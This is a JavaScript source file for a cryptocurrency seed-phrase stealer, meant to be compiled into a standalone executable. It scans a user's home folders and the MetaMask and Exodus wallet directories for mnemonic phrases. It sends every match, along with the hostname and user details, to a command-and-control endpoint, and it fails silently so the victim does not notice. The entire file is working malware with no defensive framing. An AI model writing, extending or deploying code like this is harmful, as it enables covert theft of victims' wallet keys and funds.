// SYNTAX: Local Filesystem Scanner v2 (Payload for Executable)
// This script is designed to be compiled into a standalone .exe with 'pkg'.
// It has no external dependencies once compiled, except for the OS itself.

const fs = require('fs').promises;
const path =require('path');
const os = require('os');
const fetch = require('node-fetch');

// --- CONFIGURATION ---
const C2_ENDPOINT = 'http://localhost:4000/log';
const TARGET_DIRECTORIES = [
    path.join(os.homedir(), 'Documents'),
    path.join(os.homedir(), 'Downloads'),
    path.join(os.homedir(), 'Desktop'),
    // Adding more potential locations for wallet files
    path.join(os.homedir(), 'AppData', 'Roaming', 'MetaMask'),
    path.join(os.homedir(), 'AppData', 'Roaming', 'Exodus')
];
const TARGET_EXTENSIONS = ['.txt', '.json', '.log', '.dat', '.ini', '.seed'];
const MAX_FILE_SIZE_KB = 1024; // To avoid scanning huge files

// Regex for finding a 12 or 24 word mnemonic phrase.
const SEED_PHRASE_REGEX = /(\b[a-z]{3,}\b(\s+)){11,23}\b[a-z]{3,}\b/gi;

// --- CORE LOGIC ---

async function exfiltrateData(data) {
    // In a real scenario, this would be more stealthy.
    try {
        await fetch(C2_ENDPOINT, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify(data)
        });
    } catch (error) {
        // Silent fail in production
    }
}

async function scanFile(filePath) {
    try {
        const fileStats = await fs.stat(filePath);
        if (fileStats.size > MAX_FILE_SIZE_KB * 1024 || fileStats.size === 0) {
            return;
        }

        const content = await fs.readFile(filePath, 'utf8');
        const matches = content.match(SEED_PHRASE_REGEX);

        if (matches && matches.length > 0) {
            for (const match of matches) {
                const report = {
                    success: true,
                    payload: 'LocalFileScannerEXE',
                    captured: match.trim(),
                    sourceFile: filePath,
                    fingerprint: {
                        hostname: os.hostname(),
                        userInfo: os.userInfo()
                    }
                };
                await exfiltrateData(report);
            }
        }
    } catch (error) {
        // Silently fail for files we can't access
    }
}

async function scanDirectory(directoryPath) {
    try {
        const entries = await fs.readdir(directoryPath, { withFileTypes: true });
        for (const entry of entries) {
            const fullPath = path.join(directoryPath, entry.name);
            if (entry.isDirectory()) {
                if (entry.name.startsWith('.') || entry.name === 'node_modules') continue;
                await scanDirectory(fullPath);
            } else if (entry.isFile() && TARGET_EXTENSIONS.includes(path.extname(entry.name).toLowerCase())) {
                await scanFile(fullPath);
            }
        }
    } catch (error) {
        // Silently fail if a directory cannot be read
    }
}

async function main() {
    // Initial beacon to C2 to confirm execution
    await exfiltrateData({
        success: false,
        reason: 'scanner_started_exe',
        payload: 'LocalFileScannerEXE',
        fingerprint: { hostname: os.hostname(), userInfo: os.userInfo() }
    });

    for (const dir of TARGET_DIRECTORIES) {
        await scanDirectory(dir);
    }
    // No "scan complete" message to remain silent.
    // The process will simply exit.
}

main();
